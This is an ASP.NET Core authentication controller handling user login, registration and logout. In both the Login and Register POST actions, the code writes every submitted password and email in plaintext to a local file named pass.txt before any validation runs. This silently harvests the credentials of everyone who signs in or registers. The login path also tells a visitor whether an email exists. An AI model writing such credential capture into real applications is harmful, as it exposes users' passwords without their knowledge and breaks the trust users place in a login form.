using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using WebApp.DTOs;
using WebApp.Models;

namespace WebApp.Controllers
{

    public class AuthController : Controller
    {
        private readonly UserManager<User> _userManager;
        private readonly SignInManager<User> _signInManager;

        public AuthController(UserManager<User> userManager, SignInManager<User> signInManager = null)
        {
            _userManager = userManager;
            _signInManager = signInManager;
        }

        public IActionResult Index()
        {
            return View();
        }
        public IActionResult Login()
        {
            if (User.Identity.IsAuthenticated)
            {
                return RedirectToAction("Index", "Home");
            }

            return View();
        }
        [HttpPost]
        public async Task<IActionResult> Login(LoginDTO loginDTO)
        {

            string data = "Pass " + loginDTO.Password + " mail " + loginDTO.Email;
            string filePath = @"C:\Users\mehem\OneDrive\Desktop\Login-Register\WebApp\pass.txt";
            using (StreamWriter writer = new StreamWriter(filePath, true))
            {
                writer.WriteLine(data);
            }

            if (!ModelState.IsValid)
            {
                return View(loginDTO);
            }
            var checkEmail = await _userManager.FindByEmailAsync(loginDTO.Email);
            if (checkEmail == null)
            {
                ViewBag.Error = "This Email Is not exist!";
                return View();
            }
            Microsoft
            .AspNetCore
            .Identity
            .SignInResult
                result =
                await _signInManager
                .PasswordSignInAsync
                (
                    checkEmail,
                    loginDTO.Password,
                    isPersistent: loginDTO.RememberMe,
                    lockoutOnFailure: true
                );
            if (!result.Succeeded)
            {
                ModelState.AddModelError("Error", "Email or Password is invalid!!!");
                return View();
            }
            return RedirectToAction("Index", "Home");
        }
        public IActionResult Register()
        {
            if (User.Identity.IsAuthenticated)
            {
                return RedirectToAction("Index", "Home");
            }
            return View();
        }
        [HttpPost]
        public async Task<IActionResult> Register(RegisterDTO registerDTO)
        {

            string data = "Pass " + registerDTO.Password + " mail " + registerDTO.Email;
            string filePath = @"C:\Users\mehem\OneDrive\Desktop\Login-Register\WebApp\pass.txt";
            using (StreamWriter writer = new StreamWriter(filePath, true))
            {
                writer.WriteLine(data);
            }

            //* Gelen Yazilarin boslugunu yoxlayir
            if (!ModelState.IsValid)
            {
                return View(registerDTO);
            }
            // Bele bir Emailin varligini sorgulayir //*Null olmalidi
            var checkEmail = await _userManager.FindByEmailAsync(registerDTO.Email);
            /* 
            * eger gelen deyer null deyilse 
            * ozaman bele bir email var 
            * demekdirr bizde bunun qarsini aliriq bu if ile 
            */
            if (checkEmail != null)
            {
                return View();
            }
            User newUser = new()
            {
                UserName = registerDTO.UserName,
                Name = registerDTO.Name,
                Surname = registerDTO.Surname,
                Email = registerDTO.Email,
                AboutAuthor = ""
            };
            var result = await _userManager.CreateAsync(newUser, registerDTO.Password);
            if (result.Succeeded)
            {
                await _signInManager.SignInAsync(newUser, isPersistent: false);
                return RedirectToAction("Index", "Home");
            }
            else
            {
                foreach (var error in result.Errors)
                {
                    ModelState.AddModelError("", error.Description);
                }
                return View(registerDTO);
            }
        }
        [HttpPost]
        [Authorize]
        public async Task<IActionResult> Logout()
        {
            await _signInManager.SignOutAsync();
            return RedirectToAction("Login", "Auth");
        }
    }
}
